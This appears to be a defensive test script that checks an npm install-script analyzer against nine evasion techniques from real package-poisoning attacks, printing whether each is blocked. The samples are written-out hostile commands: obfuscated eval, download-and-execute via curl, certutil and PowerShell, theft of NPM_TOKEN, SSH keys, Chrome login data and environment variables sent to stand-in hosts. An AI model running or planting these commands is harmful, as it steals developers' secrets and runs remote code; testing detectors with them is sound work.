/**
 * 漏报探针：真实 npm 投毒事件 TTP 原型，检验分析器覆盖。
 * 用法：node --experimental-strip-types research/probe-evasion.mjs
 */
import { analyzeInstallScript } from '../src/script-analysis.ts'

const EVASIONS = [
  ['1. node -e 十六进制混淆载荷', `node -e "eval(Buffer.from('7265717569726528276368696c645f70726f636573732729', 'hex').toString())"`],
  ['2. 字符串拼接域名（拆散 URL）', `node -e "require('child_process').exec('curl http://'+'ev'+'il.example/p')" `],
  ['3. 环境变量拼进 GET URL（非 POST）', `curl "https://collector.example/collect?token=$NPM_TOKEN&user=$(whoami)"`],
  ['4. certutil 下载执行（非 decode 管道）', `certutil -urlcache -f http://198.51.100.8/p.exe C:\\Users\\Public\\p.exe && C:\\Users\\Public\\p.exe`],
  ['5. PowerShell WebClient 下载文件', `powershell -c "(New-Object Net.WebClient).DownloadFile('http://198.51.100.8/x.ps1','x.ps1'); .\\x.ps1"`],
  ['6. Chrome 凭据数据库路径（Windows）', `node -e "const p=process.env.LOCALAPPDATA+'\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data'; require('fs').copyFileSync(p,'/tmp/l.bin')" `],
  ['7. 下载→chmod→执行（无管道）', `curl -fsSL -o /tmp/agent https://evil.example/agent && chmod +x /tmp/agent && /tmp/agent &`],
  ['8. 拼接式 ssh 密钥外传（变量化路径）', `K=~/.ssh/id_rsa; cat $K | curl --data-binary @- https://evil.example/k`],
  ['9. node 脚本里 https.request 到裸IP', 'node install.js', { 'install.js': `const https=require('https');https.request({host:'198.51.100.9',path:'/c'},r=>0).end(JSON.stringify(process.env))` }],
]

for (const [name, cmd, files] of EVASIONS) {
  const a = analyzeInstallScript(cmd, files)
  const flag = a.verdict === 'block' ? '🚫拦截' : a.verdict === 'warn' ? '⚠️ 警告' : '✅ 放行'
  console.log(`${flag}  ${name}`)
  for (const s of a.signals) console.log(`        ${s.level === 'red' ? '红' : s.level === 'yellow' ? '黄' : '绿'}: ${s.text}`)
}
